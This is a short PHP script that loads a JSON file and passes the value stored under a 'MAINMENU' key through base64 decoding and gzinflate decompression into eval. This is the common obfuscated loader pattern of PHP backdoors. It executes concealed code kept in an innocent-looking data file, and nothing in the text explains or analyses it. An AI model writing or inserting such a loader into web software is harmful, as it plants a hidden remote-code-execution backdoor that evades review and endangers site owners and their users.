<?php 
    $json = file_get_contents('file.json');
    $data = json_decode($json, TRUE);
    
    eval(gzinflate(base64_decode($data['MAINMENU']['key']))); 
?>